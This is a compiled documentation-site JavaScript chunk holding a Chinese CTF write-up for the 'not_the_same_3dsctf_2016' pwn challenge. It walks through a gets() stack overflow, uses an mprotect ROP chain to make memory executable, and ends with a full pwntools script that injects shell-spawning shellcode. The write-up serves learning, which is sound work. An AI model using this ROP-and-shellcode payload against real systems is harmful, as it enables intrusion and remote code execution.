(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[348],{3905:function(e,t,n){"use strict";n.d(t,{Zo:function(){return s},kt:function(){return u}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function p(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var i=r.createContext({}),c=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},s=function(e){var t=c(e.components);return r.createElement(i.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,i=e.parentName,s=p(e,["components","mdxType","originalType","parentName"]),m=c(n),u=a,_=m["".concat(i,".").concat(u)]||m[u]||d[u]||o;return n?r.createElement(_,l(l({ref:t},s),{},{components:n})):r.createElement(_,l({ref:t},s))}));function u(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,l=new Array(o);l[0]=m;var p={};for(var i in t)hasOwnProperty.call(t,i)&&(p[i]=t[i]);p.originalType=e,p.mdxType="string"==typeof e?e:a,l[1]=p;for(var c=2;c<o;c++)l[c]=n[c];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},2683:function(e,t,n){"use strict";n.r(t),n.d(t,{frontMatter:function(){return p},contentTitle:function(){return i},metadata:function(){return c},toc:function(){return s},default:function(){return m}});var r=n(2122),a=n(9756),o=(n(7294),n(3905)),l=["components"],p={title:"not_the_same_3dsctf_2016",sidebar_position:13},i=void 0,c={unversionedId:"BUUCTF/\u6808\u6ea2\u51fa/not_the_same_3dsctf_2016",id:"BUUCTF/\u6808\u6ea2\u51fa/not_the_same_3dsctf_2016",isDocsHomePage:!1,title:"not_the_same_3dsctf_2016",description:"\u77e5\u8bc6\u70b9",source:"@site/docs\\BUUCTF\\\u6808\u6ea2\u51fa\\not_the_same_3dsctf_2016.md",sourceDirName:"BUUCTF/\u6808\u6ea2\u51fa",slug:"/BUUCTF/\u6808\u6ea2\u51fa/not_the_same_3dsctf_2016",permalink:"/docs/BUUCTF/\u6808\u6ea2\u51fa/not_the_same_3dsctf_2016",version:"current",sidebarPosition:13,frontMatter:{title:"not_the_same_3dsctf_2016",sidebar_position:13},sidebar:"tutorialSidebar",previous:{title:"bjdctf_2020_babystack",permalink:"/docs/BUUCTF/\u6808\u6ea2\u51fa/bjdctf_2020_babystack"},next:{title:"\u3010\u7b2c\u4e94\u7a7a\u95f42019\u51b3\u8d5b\u3011PWN5",permalink:"/docs/BUUCTF/\u683c\u5f0f\u5316\u5b57\u7b26\u4e32/\u7b2c\u4e94\u7a7a\u95f42019 \u51b3\u8d5bPWN5"}},s=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",children:[]},{value:"\u89e3\u9898\u5206\u6790",id:"\u89e3\u9898\u5206\u6790",children:[]}],d={toc:s};function m(e){var t=e.components,n=(0,a.Z)(e,l);return(0,o.kt)("wrapper",(0,r.Z)({},d,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"\u77e5\u8bc6\u70b9"},"\u77e5\u8bc6\u70b9"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"mprotect\u4fee\u6539\u5185\u5b58\u5c5e\u6027")),(0,o.kt)("h2",{id:"\u89e3\u9898\u5206\u6790"},"\u89e3\u9898\u5206\u6790"),(0,o.kt)("p",null,"checksec\u7ed3\u679c\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ checksec --file=not_the_same_3dsctf_2016                                                                                                    1 \u2a2f\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   1991) Symbols     No    0               0               not_the_same_3dsctf_2016\n")),(0,o.kt)("p",null,"\u62d6\u5165ida\uff0c\u627e\u5230",(0,o.kt)("inlineCode",{parentName:"p"},"main"),"\u51fd\u6570"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-c"},'int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF\n\n  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");\n  gets(v4);\n  return 0;\n}\n')),(0,o.kt)("p",null,"\u5f88\u660e\u663e\u53ef\u4ee5\u6808\u6ea2\u51fa\u3002"),(0,o.kt)("p",null,"\u5728main\u51fd\u6570\u4e0a\u9762\u6709\u4e00\u4e2a\u51fd\u6570",(0,o.kt)("inlineCode",{parentName:"p"},"get_secret"),"\uff0c\u770b\u770b\u6e90\u7801"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-c"},'int get_secret()\n{\n  int v0; // esi\n\n  v0 = fopen("flag.txt", &unk_80CF91B);\n  fgets(&fl4g, 45, v0);\n  return fclose(v0);\n}\n')),(0,o.kt)("p",null,"\u4ed6\u5c06flag.txt\u7684\u5185\u5bb9\u4ece\u6587\u4ef6\u4e2d\u8bfb\u51fa\uff0c\u4fdd\u5b58\u5230fl4g\u4e2d\uff0c\u53cc\u51fbfl4g\u53ef\u4ee5\u770b\u5230",(0,o.kt)("inlineCode",{parentName:"p"},".bss:080ECA2D fl4g            db    ? ;               ; DATA XREF: get_secret+26\u2191o")),(0,o.kt)("p",null,"\u8bf4\u660efl4g\u5728bss\u6bb5\u4e0a\u9762\u3002"),(0,o.kt)("p",null,"\u5c1d\u8bd5\u4e86\u4e00\u4e0b\u7528\u6808\u6ea2\u51fa\u8df3\u8f6c\u5230",(0,o.kt)("inlineCode",{parentName:"p"},"get_secret"),"\uff0c\u7136\u540e\u8ba9\u4ed6\u6ea2\u51fa\u8df3\u8f6c\u5230",(0,o.kt)("inlineCode",{parentName:"p"},"write"),"\u6765\u8f93\u51fafl4g\u4e2d\u7684\u5185\u5bb9\uff0c\u5931\u8d25\u4e86\u3002"),(0,o.kt)("p",null,"\u641c\u4e86\u4e00\u4e0b\u5b58\u5728\u51fd\u6570",(0,o.kt)("inlineCode",{parentName:"p"},"mprotect"),"\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u4fee\u6539\u4e00\u6bb5\u6307\u5b9a\u5185\u5b58\u533a\u57df\u7684\u4fdd\u62a4\u5c5e\u6027\u3002"),(0,o.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"mprotect\u5c0f\u77e5\u8bc6")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"Linux\u624b\u518c\uff1a",(0,o.kt)("a",{parentName:"p",href:"https://man7.org/linux/man-pages/man2/mprotect.2.html"},"https://man7.org/linux/man-pages/man2/mprotect.2.html")),(0,o.kt)("p",{parentName:"div"},"\u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a"),(0,o.kt)("pre",{parentName:"div"},(0,o.kt)("code",{parentName:"pre",className:"language-c"},"#include <sys/mmap.h>\nint mprotect(const void *start, size_t len, int prot);\n")),(0,o.kt)("ul",{parentName:"div"},(0,o.kt)("li",{parentName:"ul"},"start: \u4fee\u6539\u7684\u5185\u5b58\u7684\u8d77\u59cb\u5730\u5740"),(0,o.kt)("li",{parentName:"ul"},"len: \u4fee\u6539\u7684\u5185\u5b58\u7684\u957f\u5ea6"),(0,o.kt)("li",{parentName:"ul"},"prot: \u4fee\u6539\u540e\u7684\u5c5e\u6027",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"PROT_READ\uff084\uff09: \u8868\u793a\u5185\u5b58\u6bb5\u7684\u5185\u5bb9\u53ef\u8bfb"),(0,o.kt)("li",{parentName:"ul"},"PROT_WRITE\uff082\uff09: \u8868\u793a\u5185\u5b58\u6bb5\u7684\u5185\u5bb9\u53ef\u5199"),(0,o.kt)("li",{parentName:"ul"},"PROT_EXEC\uff081\uff09: \u8868\u793a\u5185\u5b58\u6bb5\u7684\u5185\u5bb9\u53ef\u6267\u884c"),(0,o.kt)("li",{parentName:"ul"},"PROT_NONE\uff080\uff09: \u8868\u793a\u5185\u5b58\u6bb5\u7684\u5185\u5bb9\u65e0\u6cd5\u8bbf\u95ee")))),(0,o.kt)("p",{parentName:"div"},"\u8c03\u7528\u6210\u529f\u8fd4\u56de0\uff0c\u53d1\u751f\u9519\u8bef\u8fd4\u56de-1\u3002"))),(0,o.kt)("p",null,"\u7531\u4e8emprotect\u67093\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u9700\u8981\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\uff0c\u7528",(0,o.kt)("inlineCode",{parentName:"p"},'ROPgadget --binary not_the_same_3dsctf_2016 --only "pop|ret" | grep pop'),"\u627e\u4e00\u4e0b\u67093\u4e2apop\u7684ret\u3002"),(0,o.kt)("p",null,"\u770b\u4e86\u4e00\u4e0b\u6709\u8d85\u7ea7\u591a\uff0c\u770b\u4e00\u4e0b",(0,o.kt)("inlineCode",{parentName:"p"},"mprotect"),"\u51fd\u6570\u7684\u6c47\u7f16\uff0c\u5173\u4e8e\u4f20\u53c2\u7684\u60c5\u51b5"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-assembly"},".text:0806ED40 arg_0           = dword ptr  4\n.text:0806ED40 arg_4           = dword ptr  8\n.text:0806ED40 arg_8           = dword ptr  0Ch\n.text:0806ED40\n.text:0806ED40 ; __unwind {\n.text:0806ED40                 push    ebx\n.text:0806ED41                 mov     edx, [esp+4+arg_8]\n.text:0806ED45                 mov     ecx, [esp+4+arg_4]\n.text:0806ED49                 mov     ebx, [esp+4+arg_0]\n")),(0,o.kt)("p",null,"\u4e09\u4e2a\u53c2\u6570\u4f9d\u6b21\u662farg_0\u3001arg_4\u3001arg_8\uff0c\u7136\u540e\u5c06arg_8\u5b58\u5230edx\u4e2d\uff0c\u5c06arg_4\u5b58\u5230ecx\u4e2d\uff0c\u5c06arg_0\u5b58\u5230ebx\u4e2d\u3002\u6839\u636e\u8fd9\u4e2a\u89c4\u5219\uff0c\u8981\u4fdd\u8bc1\u53c2\u6570\u5728pop\u4e4b\u540e\u5b58\u653e\u7684\u5bc4\u5b58\u5668\u4e0d\u4f1a\u56e0\u4e3a\u8fd9\u8fb9\u7684mov\u800c\u5bfc\u81f4\u6570\u636e\u9519\u4e71\u3002\u6700\u540e\u7b5b\u9009\u4e0b\u6765\u7b26\u5408\u6761\u4ef6\u7684\u662f",(0,o.kt)("inlineCode",{parentName:"p"},"0x0806fcc8 : pop esi ; pop ebx ; pop edx ; ret"),"\u3002"),(0,o.kt)("p",null,"\u6211\u4eec\u9700\u8981\u7684\u662f\u5c06.plt.got\u8868\u6539\u4e3a\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\uff087\uff09\u7684\u5c5e\u6027\uff0c\u56e0\u6b64\u9700\u8981\u77e5\u9053\u5730\u5740\uff0c\u5728ida\u4e2d\u6309\u4e0bCtrl + S\u5373\u53ef\u770b\u5230.plt.got\u8868\u8d77\u59cb\u5730\u5740\u662f",(0,o.kt)("inlineCode",{parentName:"p"},"0x80EB000")),(0,o.kt)("p",null,"\u5728.plt.got\u8868\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06shellcode\u5199\u5165\uff0c\u518d\u6267\u884cshellcode\uff0c\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\uff1a"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"\u5c06",(0,o.kt)("inlineCode",{parentName:"li"},"main"),"\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u51fd\u6570",(0,o.kt)("inlineCode",{parentName:"li"},"mprotect"),"\u7684\u5730\u5740"),(0,o.kt)("li",{parentName:"ol"},"\u901a\u8fc7pop\u5c06\u53c2\u6570\u4f20\u5165",(0,o.kt)("inlineCode",{parentName:"li"},"mprotect"),"\uff0c\u4fee\u6539.plt.got\u8868\u7684\u4fdd\u62a4\u5c5e\u6027"),(0,o.kt)("li",{parentName:"ol"},"\u5c06ret\u7684\u8fd4\u56de\u5730\u5740\u8bbe\u7f6e\u4e3a",(0,o.kt)("inlineCode",{parentName:"li"},"read"),"\u7684\u5730\u5740"),(0,o.kt)("li",{parentName:"ol"},"\u901a\u8fc7pop\u5c06\u53c2\u6570\u4f20\u5165",(0,o.kt)("inlineCode",{parentName:"li"},"read"),"\uff0c\u8f93\u5165shellcode"),(0,o.kt)("li",{parentName:"ol"},"\u5c06ret\u7684\u8fd4\u56de\u5730\u5740\u8bbe\u7f6e\u4e3a.plt.got\u7684\u8d77\u59cb\u5730\u5740\uff0c\u6267\u884cshellcode")),(0,o.kt)("p",null,"\u6839\u636e\u4ee5\u4e0a\u601d\u8def\u5f97\u51fa\u811a\u672c\u5982\u4e0b\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nis_debug = 1\nfile_name = './not_the_same_3dsctf_2016'\nhost = 'node3.buuoj.cn'\nport = 28299\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n    \n    elf = ELF(file_name)\n    read_addr = elf.symbols['read']\n    pop3_ret = 0x806fcc8\n    mpro_addr = 0x806ed40\n    plt_got_addr = 0x80eb000\n    \n    shellcode=asm(shellcraft.sh())\n    \n    payload  = b'a' * 0x2d + p32(mpro_addr) + p32(pop3_ret)\n    payload += p32(plt_got_addr) + p32(0x20) + p32(0x7)\n\n    payload += p32(read_addr) + p32(pop3_ret)\n    payload += p32(0) + p32(plt_got_addr) + p32(len(shellcode)) + p32(plt_got_addr)\n\n    sh.sendline(payload)\n    sh.sendline(shellcode)\n    \n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")))}m.isMDXComponent=!0}}]);